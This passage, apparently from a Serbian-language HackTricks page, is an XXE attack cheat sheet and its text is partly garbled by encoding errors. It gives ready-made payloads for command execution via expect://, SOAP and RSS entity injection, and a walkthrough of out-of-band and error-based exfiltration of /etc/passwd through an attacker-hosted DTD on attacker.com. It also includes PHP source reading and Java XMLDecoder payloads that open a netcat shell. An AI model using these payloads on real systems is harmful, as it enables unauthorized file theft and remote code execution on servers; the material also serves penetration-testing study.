<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Ovaj primer je inspirisan na [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) se koristi za standardizaciju razmene podataka u procesima lokalizacije. To je format zasnovan na XML-u koji se uglavnom koristi za prenos lokalizovanih podataka izme캠u alata tokom lokalizacije i kao zajedni캜ki format razmene za CAT (ra캜unarski podr쬬ni prevod) alate.

### Analiza slepe zahteve

Zahtev je poslat serveru sa slede캖im sadr쬬jem:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Me캠utim, ovaj zahtev pokre캖e internu serversku gre코ku, ta캜nije pominje problem sa deklaracijama obele쬵a:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Iako se pojavila gre코ka, zabele쬰n je pogodak na Burp Collaborator-u, 코to ukazuje na odre캠eni nivo interakcije sa spoljnom entitetom.

Izvantraga캜ko izvla캜enje podataka Da bi se izvukli podaci, 코alje se modifikovan zahtev:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ovaj pristup otkriva da User Agent pokazuje kori코캖enje Java 1.8. Prime캖eno ograni캜enje ove verzije Jave je nemogu캖nost povla캜enja datoteka koje sadr쬰 znak nove linije, poput /etc/passwd, kori코캖enjem tehnike van opsega.

Izvo캠enje podataka zasnovano na gre코kama Da bi se prevazi코lo ovo ograni캜enje, koristi se pristup zasnovan na gre코kama. DTD datoteka je strukturirana na slede캖i na캜in kako bi izazvala gre코ku koja uklju캜uje podatke iz ciljne datoteke:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Server odgovara gre코kom, va쬹o je da odra쬬va nepostoje캖i fajl, 코to ukazuje da server poku코ava da pristupi navedenom fajlu:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Da biste uklju캜ili sadr쬬j datoteke u poruku o gre코ci, DTD datoteka je pode코ena:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Ova modifikacija dovodi do uspe코ne ekstrakcije sadr쬬ja datoteke, kako je prikazano u izlaznoj gre코ci poslatoj putem HTTP-a. Ovo ukazuje na uspe코an XXE (XML Eksterni Entitet) napad, iskori코캖avaju캖i i Tehnike van opsega i zasnovane na gre코kama kako bi se izvukle osetljive informacije.

## RSS - XEE

Validan XML sa RSS formatom za iskori코캖avanje ranjivosti XXE.

### Ping nazad

Jednostavan HTTP zahtev ka serveru napada캜a
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### 캛itanje fajla
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### 캛itanje izvornog koda

Kori코캖enjem PHP base64 filtera
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder je Java klasa koja kreira objekte na osnovu XML poruke. Ako zlonamerni korisnik mo쬰 naterati aplikaciju da koristi proizvoljne podatke u pozivu metode **readObject**, odmah 캖e dobiti izvr코enje koda na serveru.

### Kori코캖enje Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Alati

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Reference

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Izvla캜enje informacija putem HTTP-a kori코캖enjem sopstvenog eksternog DTD-a: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)


<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}
<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
